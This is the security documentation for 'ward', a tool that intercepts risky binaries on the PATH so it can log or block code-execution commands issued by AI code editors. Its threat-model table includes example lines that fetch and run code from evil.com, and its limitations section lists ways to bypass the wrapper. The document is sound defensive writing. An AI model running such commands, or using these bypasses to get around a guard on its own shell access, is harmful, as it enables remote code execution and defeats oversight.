# Security Documentation

## Threat Model

### What ward Protects Against

ward is designed to mitigate **"auto-approved binary flag-to-RCE"** attacks in AI code editor environments. These occur when:

1. An AI assistant (Claude Code, Cursor, etc.) is given permission to execute shell commands
2. The AI is tricked or manipulated into running dangerous commands
3. Safe-looking binaries are used with dangerous flags that enable arbitrary code execution

**Primary attack patterns mitigated:**

| Pattern | Example | Risk |
|---------|---------|------|
| find -exec RCE | `find . -exec sh -c "curl evil.com\|sh" \;` | Downloads and executes malicious code |
| Shell -c injection | `bash -c "$(curl evil.com)"` | Arbitrary shell command execution |
| Python -c code exec | `python -c "import os; os.system(...)"` | Arbitrary Python code execution |
| Node -e eval | `node -e "require('child_process').exec(...)"` | Arbitrary JavaScript execution |
| tar checkpoint exploit | `tar --checkpoint-action=exec=cmd` | Command execution during extraction |

### What ward Does NOT Protect Against

1. **Kernel-level bypasses**: User-space PATH interception can be bypassed by:
   - Direct syscalls
   - Absolute path execution (`/usr/bin/find` instead of `find`)
   - LD_PRELOAD manipulation
   - Binary renaming/copying

2. **Non-wrapped binaries**: Only the configured binaries are protected. Other dangerous tools (perl, ruby, etc.) are not covered by default.

3. **Insider threats**: If a user intentionally wants to bypass protection, they can.

4. **Privilege escalation**: Cannot prevent exploits that gain root/admin access.

5. **Network-level attacks**: Does not inspect network traffic or prevent data exfiltration.

6. **Memory corruption exploits**: Cannot detect or prevent buffer overflows or similar attacks.

## Security Architecture

### User-Space PATH Interception

ward uses a user-space interception approach:

```
User/AI requests: find . -exec sh -c "cmd" \;
           │
           ▼
    PATH lookup
           │
           ▼
~/.ward/guarded-bin/find  (wrapper script, first in PATH)
           │
           ▼
    Parse arguments
    Check against policy
           │
           ├─── If dangerous + enforce mode ─── BLOCK + LOG
           │
           └─── Otherwise ─── LOG + exec real binary
```

### Wrapper Scripts

Each wrapper:
1. Logs the invocation (argv, cwd, timestamp, parent process)
2. Checks arguments against the security policy
3. In enforce mode, blocks matching patterns
4. Otherwise, executes the real binary with preserved arguments and exit codes

### Process Attribution

Best-effort parent process tracking:
- Linux: Reads `/proc/<pid>/comm` and `/proc/<pid>/cmdline`
- macOS: Uses `ps -p <pid> -o ppid=,comm=`

This helps identify whether commands originated from Claude Code or Cursor.

## Limitations

### Coverage Gaps

1. **Absolute paths bypass protection**
   ```bash
   /usr/bin/find . -exec sh -c "cmd" \;  # Bypasses wrapper
   ```

2. **env command bypass**
   ```bash
   env find . -exec sh -c "cmd" \;  # May bypass depending on env behavior
   ```

3. **Subshell execution**
   ```bash
   (PATH=/usr/bin:$PATH; find . -exec sh -c "cmd" \;)  # Bypasses wrapper
   ```

4. **Binary copying**
   ```bash
   cp /usr/bin/find /tmp/myfind
   /tmp/myfind . -exec sh -c "cmd" \;  # Bypasses wrapper
   ```

### Detection Evasion

Sophisticated attackers can evade detection:
- Obfuscated command arguments
- Multi-stage payloads
- Time-delayed execution
- Alternative interpreter chains

### Platform Limitations

- **Cursor (desktop app)**: Protection is best-effort. Cursor may spawn child processes that don't inherit the modified PATH.
- **Windows**: Not currently supported (stubbed with TODO).

## Safe Usage Guidelines

### Do

- ✅ Use `ward launch <tool>` to start protected sessions
- ✅ Review logs regularly: `ward logs`
- ✅ Run scans periodically: `ward scan`
- ✅ Start with observe-only mode before enabling enforcement
- ✅ Keep ward updated

### Don't

- ❌ Rely on ward as your only security control
- ❌ Assume protection against sophisticated attackers
- ❌ Grant AI assistants admin/root privileges
- ❌ Disable logging
- ❌ Modify wrapper scripts manually

## Incident Response

If ward blocks or detects a suspicious command:

1. **Review the log entry**
   ```bash
   ward logs --verbose
   ```

2. **Identify the source**
   - Check the AI editor session that triggered it
   - Review the conversation/prompt that led to the command

3. **Assess the risk**
   - Was this a legitimate command?
   - Could it have been prompt injection?

4. **Take action**
   - If malicious: end the AI session, review for data exfiltration
   - If false positive: consider policy adjustment

## Enterprise Deployment

For enterprise environments, consider:

1. **Centralized logging**: Forward ward logs to SIEM
2. **Policy management**: Distribute standardized policies
3. **Audit trails**: Maintain records of all AI-assisted code changes
4. **Layered security**: Combine with:
   - EDR (Endpoint Detection and Response)
   - Application allowlisting
   - Network segmentation
   - Code review processes

## Reporting Security Issues

If you discover a security vulnerability in ward:

1. **Do NOT** create a public GitHub issue
2. Email security concerns to: [security contact]
3. Include:
   - Description of the vulnerability
   - Steps to reproduce
   - Potential impact
   - Suggested fix (if any)

## Changelog

### v0.1.0 (Initial Release)
- User-space PATH interception for risky binaries
- Detection of find -exec, shell -c, python -c, node -e, tar checkpoint patterns
- Observe-only and enforce modes
- Claude Code and Cursor discovery
- Demo mode with mock data

## References

- [MITRE ATT&CK - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
- [GTFOBins - Unix binaries for privilege escalation](https://gtfobins.github.io/)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
